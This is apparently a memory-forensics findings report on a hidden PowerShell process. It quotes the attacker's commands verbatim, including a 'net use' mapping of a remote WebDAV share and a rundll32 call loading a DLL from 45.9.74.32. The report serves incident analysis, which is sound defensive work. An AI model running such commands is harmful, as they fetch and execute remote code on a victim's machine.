Finding 1:
Suspicious PowerShell execution.

A PowerShell process (PID 3692) was identified executing with hidden
window style:

powershell.exe -windowstyle hidden

The process executed commands involving a remote WebDAV resource.


Finding 2:
Remote WebDAV access.

The PowerShell process executed:

net use \\45.9.74.32@8888\davwwwroot\


The connection was confirmed through memory network analysis.


Finding 3:
Remote DLL execution attempt.

The same PowerShell command attempted to execute:

rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry


The payload could not be recovered from the memory dump.


Finding 4:
Suspicious memory regions.

PowerShell contained PAGE_EXECUTE_READWRITE memory regions,
which may indicate dynamic code execution or injected content.
